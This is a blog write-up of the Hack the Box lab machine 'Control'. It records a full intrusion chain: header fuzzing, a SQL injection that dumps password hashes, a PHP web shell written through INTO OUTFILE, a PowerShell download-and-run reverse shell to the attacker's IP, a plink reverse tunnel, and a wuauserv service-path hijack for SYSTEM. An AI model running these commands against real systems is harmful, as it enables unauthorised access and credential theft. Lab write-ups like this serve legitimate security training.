+++
author = "Nick"
categories = ["hack the box", "Hard", "wfuzz", "burpsuite", "sqlmap", "sqli", "reverse shell", "netcat", "plink", "reverse tunnel", "evil-winrm", "wuauserv", "windows"]
date = 2020-04-25T13:28:35Z
description = ""
draft = false
thumbnail = "/images/2019/12/control.png"
slug = "hack-the-box-control"
summary = "Welcome back! Today we are doing the Hack the Box machine, Control. It's a Linux machine listed as Hard. Let's see what's in store!"
tags = ["hack the box", "Hard", "wfuzz", "burpsuite", "sqlmap", "sqli", "reverse shell", "netcat", "plink", "reverse tunnel", "evil-winrm", "wuauserv", "windows"]
title = "Hack the Box - Control"
url = "/hack-the-box-control"
 

+++


Welcome back! Today we are doing the Hack the Box machine, Control. It's a Windows machine listed as Hard. Let's see what's in store!

As usual, we start with our ```nmap``` scan. For Hard boxes, I have gotten into the habbit of scanning all ports first rather than going back and rescanning based on initial results. I might in the future look to use something like ```Legion``` or ```Sparta``` to help streamline the enumeration.

Command:
```nmap -sC -sV -T4 -p- -oA Initial_all 10.10.10.167```

Our results:
```
Nmap scan report for 10.10.10.167
Host is up (0.055s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   GenericLines, LDAPBindReq, NULL: 
|_    Host '10.10.14.119' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=12/12%Time=5DF25396%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.119'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLin
SF:es,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.119'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.119'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.54 seconds
```

We see ```MySQL``` and ```MSRPC``` those are fun exploitable ports. Let's see what's being hosted on port 80.

We are greeted with a fun landing page. When we look at the source we see some comments.

![](/images/2019/12/image-19.png)

This might be the host itself, or a docker instance or just junk. The admin page tells us to go through the proxy for access.

![](/images/2019/12/image-20.png)

It seems that it's expecting a certain header parameter. We can use ```wfuzz``` to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers). So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a ```192.168.4.28``` address. We can generate a list of every IP in that scope and use that. This is what our total command will look like:

Command:
```wfuzz -c -w  /usr/share/wordlists/custom/http-headers-fuzz.txt -w /usr/share/wordlists/custom/ip-192-168-4-0.txt --hs "Header Missing" --sc "200" -H "FUZZ:FUZ2Z" "http://10.10.10.167/admin.php"```

A quick breakdown of the above command:
```-c``` will output with colors, I like colors.
```-w``` specifies a wordlist.
```--hs``` will hide responses of the type following it. In this case "Header Missing".
```--sc``` will show response codes of the type following it. In this case 200.
```-H``` specifies header parameters.
```"FUZZ:FUZ2Z"``` These are the two header parameters we are fuzzing. FUZZ is for the first wordlist specified. FUZ2Z is for the second word list specified. So we have something like this in the header of our request: "Acces-Control-Allow-Origin:192.168.4.44"
```"http://10.10.10.167/admin.php"``` Lastly, the target URL.

![](/images/2019/12/long_wfuzz.gif" caption="Warning, this gif is 2:48 seconds long....)

We see this works for us, we have a valid response to one of our header requests [```X-Forwarded-For```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) on IP ```192.168.4.28```. Now we can load up ```BurpSuite```, apply this header to our request and gain access to the admin page.

Inside ```BurpSuite``` we can set our requests to append our header value. 

Proxy > Options > Match and Replace.

We'll set the `Replace` field to be: `X-forwarded for: 192.168.4.28`

![](/images/2019/12/burp-x.gif)

Now any requests we send to this domain will append our header parameter. We can then go to ```/admin.php``` and take a peek. We get a product search field

![](/images/2019/12/image-21.png)

We can use ```SQLMap``` to see if anything is vulnerable here. Now we can use ```--Proxy=localhost:8080``` option to route it through ```BurpSuite``` to get our appended header to each request. I had some issues with that method, I'm not sure if it was because my connection was unstable, SQLMap was unstable or both. Another solution is to just take our request from Burp and put it in a file and give that file to ```SQLMap```.

req.txt file:
```
POST /search_products.php HTTP/1.1
Host: 10.10.10.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.167/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
X-Forward-For: 192.168.4.28
Connection: close
Upgrade-Insecure-Requests: 1

productName=item
```

Lets give it to ```SQLMap```:

Command:
```sqlmap --all -r req.txt --batch```

Our injections run and we find some injectable fields. The key take away are the hashes:

```
database management system users password hashes:
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
```
```
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
    clear-text password: l3tm3!n
```
```
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8
```

We can take these passwords and send them into `John`. Also `sqlmap` will take a pass at them as well.

![](/images/2020/01/image-14.png" caption="manager password.)

![](/images/2020/01/image-15.png" caption="hector password)

We dont seem to be able to login with the credentials however. We know from our `sqlmap` run that `wwwroot` is writeable. We now need to upload a shell to this directory in order to potentially leverage these credentials internally. [This](https://offsec.vchur.dk/2019/02/24/sql-injection-rce-and-lfi/) is a quick resource. You could alternatly use `sqlmap` to [upload a file](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/). In this case I used the former, slightly changed.

Injection:
`roductName=D-link+DWA-171'; select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'C:\\Inetpub\\wwwroot\\oops.php';#`

![](/images/2020/01/image-17.png)

Then we check the url and see if it's live.

![](/images/2020/01/image-16.png)

Awesome, we have a basic shell. We need to now leverage this to create a more robust shell. [Powercat](https://github.com/besimorhino/powercat) is a good option here. In order to download it, first we need to host it on our machine with `SimpleHTTPServer`. Set up our `netcat` listener. Then we need to issue a fairly lengthy command to our basic shell to download powercat. Then invoke it.

Commands:
HTTP Server: `python -m SimpleHTTPServer 80`
Netcat Listener: `nc -lvnp 7777`
Remote Download command ***WITH*** invoke:
`http://10.10.10.167/oops.php?cmd=powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.126:80/powercat.ps1');powercat -c 10.10.14.126 -p 7777 -e cmd"`

Once we do, we see our `HTTP Server` show activity then our `Netcat` listener activates:

![](/images/2020/01/image-18.png)

We now have a shell and should look to start enumerating further. When we look at the network via `netstat` we see that `WinRM` is running locally (port 5985).

![](/images/2020/01/image-19.png)

So how do we leverage this? Well, we can create a tunnel between this machine and ours using either `netcat.exe` or `plink.exe`. In this case we head over to `C:\Windows\System32\spool\drivers\color` and use `curl` with the `-o` option to download `plink.exe` hosted on our machine.

Command:
`curl http://10.10.14.126/plink.exe -o plink.exe`

![](/images/2020/01/image-21.png)

Now we need to [create a tunnel](https://www.google.com/search?client=firefox-b-1-d&q=plink+tunnel) with it. It should be noted that you need to have `SSH` services running and not blocked for this to work.

Command:
`.\plink.exe -l rootflag -pw rootflag -R 5985:127.0.0.1:5985 10.10.14.126`

![](/images/2020/01/control_reversetunnel.gif)

Once our tunnel is connected, we can connect to our local Kali machine with `Evil WinRM` to make a connection to the target.

Command:
`Evil-winrm -i 127.0.0.1 -u Hector -p 'l33th4x0rhector'`

![](/images/2020/01/image-22.png)

Now that we are connected, we can get our `user.txt` file! We can now look to escalate. After trying numerous enumeration types, we finally see a hint when we get our registry ACL's.

Command:
`get-acl HKLM:\System\CurrentControlSet\services\* | fl * | findstr /i "Hector Users Path"`

The output shows the rights we have on services. The key service here being `wuauserv`. We are able to leverage this service to execute a `netcat` shell back to us. 
First we'll `curl` our `netcat` binary to `C:\windows\system32\spool\drivers\color` directory.

Comand:
`curl http://10.10.14.126/nc.exe -o nc.exe`

Now we need to look at our `ImagePath` registry key.

Command:
`get-itemproperty HKLM:\System\CurrentControlSet\services\wuauserv`

![](/images/2020/01/image-23.png)

We now need to modify this value to point to `netcat` so when it's called, it will do what we want.

Command:
`reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ
/v ImagePath /d "C:\windows\system32\spool\drivers\color\nc.exe
10.10.14.126 9001 -e cmd" /f`

Then we just start the service.

Command:
`start-service wuauserv`

![](/images/2020/01/control_root.gif)

Then we get our shell as System! 

Hopefully everyone enjoyed this box as much as I did. Hopefully something was learned during this machine. If you found this write-up helpful, consider sending some respect my way: [My HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).



